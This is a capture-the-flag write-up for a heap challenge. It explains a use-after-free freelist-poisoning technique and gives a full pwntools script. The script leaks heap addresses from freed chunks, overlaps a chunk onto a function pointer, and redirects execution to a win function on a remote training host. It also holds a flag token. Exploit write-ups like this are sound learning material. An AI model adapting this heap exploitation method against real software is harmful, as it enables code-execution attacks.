# usemedontabuseme

> Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNy11c2VtZWRvbnRhYnVzZW1lIiwiaXAiOiIyMDIuODcuMTYyLjI4Iiwic2Vzc2lvbiI6IjY1ZTg2OTA0LWY0OTgtNGJmOS05Y2UxLTg3MTIyNDU5NTgwMyJ9.9goGlKsse0NEwy8CH4Hx3pfdU0TDW9I831GzNf0z6To}

## Scenario

Functions are given that allow us to create, rename and delete a certain of each allocated memory structure. We need to leverage the fact that chunk metadata and content are stored in the same location.

## Solution

We are able to view the name of a killed clone. Due to the way free chunks are stored, the pointer of the next free chunk is stored in the same location as the name. This allows us to override the location of the second-next chunk location.  

By allocating a chunk (A), then allocating a chunk (B) that starts `0xc` bytes after (A), we can modify the function pointer. By using the Give Hint functionality, the modified function pointer will be executed

## Script

```python3
#!/usr/bin/python3

'''
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
'''

'''
Data Structure

8 bytes - name
4 bytes - should be 0x6447
4 bytes - function ptr  <-- override to win
'''

# Clones --> []

from pwn import *

addr = {
    'win': 0x8048b98
}

# p = process("./usemedontabuseme")
p = remote("plsdonthaq.me", 7000)

p.recvuntil("Choice: ")

def make(id, string8):
    p.sendline("A")
    p.sendline(str(id))
    p.sendline(string8)
    p.recvuntil("Choice: ")

def kill(id):
    p.sendline("B")
    p.sendline(str(id))
    p.recvuntil("Choice: ")

def name(id, string7):
    p.sendline("C")
    p.sendline(str(id))
    p.sendline(string7)
    p.recvuntil("Choice: ")

def view(id):
    p.sendline("D")
    p.sendline(str(id))
    p.recvuntil("Name: ")
    ret = p.recvline(keepends=False)
    p.recvuntil("Choice: ")
    return ret

def hint(id):
    p.sendline("H")
    p.sendline(str(id))
    p.recvuntil("Choice: ")

def pwnHint(id):
    p.sendline("H")
    p.sendline(str(9))

# Create 3 allocations
make(0, '0000')
make(1, '1111')
make(2, '2222')

# Free the 3 allocations
### Result will be [2]->[1]->[0]
kill(0)
kill(1)
kill(2)

# Leak the addresses of [0] and [1]
addr0 = u32(view(1)[:4])
addr1 = u32(view(2)[:4])

# PWN                                                               # NEW HEAD:[2]->[1]->[0]
make(2, '')                 # Dummy [2]                             # NEW HEAD:[1]->[0]
name(0, p32(addr1 + 0xc))   # [1]->[0]->[1 + 0xc]                   # NEW HEAD:[1]->[0]->[1+0xc]
make(9, 'aaaa')             # Create clone 9 using Chunk [1]        # NEW HEAD:[0]->[1+0xc]
make(0, '')                 # Create clone 0 using Chunk [0]        # NEW HEAD:[1+0xc]
make(1, p32(addr['win']))   # Create clone 1 using Chunk [1 + 0xc]  # NEW HEAD:NULL

'''
# Chunk [1] now contains
aaaa   ...  ...... 
0x6447 ...  win fn
'''
pwnHint(9)

p.interactive()
```

